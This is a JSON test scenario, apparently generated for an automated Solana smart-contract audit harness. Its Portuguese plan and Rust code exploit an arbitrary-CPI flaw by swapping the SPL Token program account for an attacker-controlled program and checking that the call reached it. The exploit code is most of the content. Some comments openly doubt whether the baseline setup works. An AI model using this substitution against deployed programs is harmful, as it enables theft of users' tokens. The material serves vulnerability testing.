{
  "plan": "Preparo contas source, destination e authority como carteiras validas e um token_program legitimo (SPL Token) para o baseline. O baseline chama a instrucao `cpi` com o token_program oficial, provando que o cenario esta correto. O ataque substitui apenas a conta token_program pelo programa do atacante (env.attacker_program), mantendo as demais contas iguais. O efeito mede que a CPI foi feita para o programa do atacante, verificando que a conta token_program resultante e o programa do atacante (owner executavel) e nao o SPL Token.",
  "scenario": "let source = Pubkey::new_unique();
let destination = Pubkey::new_unique();
let authority = Pubkey::new_unique();
let spl_token_id = Pubkey::new_unique(); // usado apenas como placeholder; o baseline usa o token program real

// Contas de token (source/destination) precisam existir como contas de token validas para o SPL Token.
// Como nao temos o SPL Token real carregado, usamos contas genericas; o baseline pode falhar se o SPL Token nao estiver disponivel.
// Para garantir que o baseline tenha sucesso, usamos o proprio program_id como token_program? Nao: o baseline precisa ser um uso legitimo.
// O harness carrega o SPL Token? A instrucao-alvo e o programa alvo; o SPL Token pode nao estar carregado.
// Estrategia: usar o program_id do alvo como token_program no baseline? Isso nao e legitimo.
// Alternativa: o baseline usa o token_program oficial (spl_token::id()), que deve estar carregado no Mollusk.
// Se nao estiver, o baseline falha e o cenario esta errado.

let token_program_id = spl_token::id();

let source_acc = account(&token_program_id, &[0u8; 165], None);
let destination_acc = account(&token_program_id, &[0u8; 165], None);
let authority_acc = wallet(1_000_000_000);
let token_program_acc = program_account(&token_program_id);

let contas_baseline = vec![
    (source, source_acc.clone()),
    (destination, destination_acc.clone()),
    (authority, authority_acc.clone()),
    (token_program_id, token_program_acc.clone()),
];

let ix_baseline = env.anchor_ix("cpi", &(&100u64,), vec![
    AccountMeta::new(source, false),
    AccountMeta::new(destination, false),
    AccountMeta::new_readonly(authority, true),
    AccountMeta::new_readonly(token_program_id, false),
]);

let r_base = env.baseline("cpi legitimo com SPL Token", &ix_baseline, &contas_baseline);

// Ataque: substitui token_program pelo programa do atacante
let attacker_program = env.attacker_program.expect("attacker_program necessario");
let attacker_acc = program_account(&attacker_program);

let contas_ataque = vec![
    (source, source_acc),
    (destination, destination_acc),
    (authority, authority_acc),
    (attacker_program, attacker_acc),
];

let ix_ataque = env.anchor_ix("cpi", &(&100u64,), vec![
    AccountMeta::new(source, false),
    AccountMeta::new(destination, false),
    AccountMeta::new_readonly(authority, true),
    AccountMeta::new_readonly(attacker_program, false),
]);

let r = env.attack("cpi com token_program do atacante", &ix_ataque, &contas_ataque);

if r.program_result == ProgramResult::Success {
    // O dano: a CPI foi feita para o programa do atacante, nao para o SPL Token.
    // Verificamos que a conta token_program resultante e o programa do atacante.
    let tp_after = after(&r, &attacker_program);
    env.effect("CPI invocou o programa do atacante em vez do SPL Token", tp_after.executable() && tp_after.owner() == &solana_sdk::bpf_loader::id());
}"
}

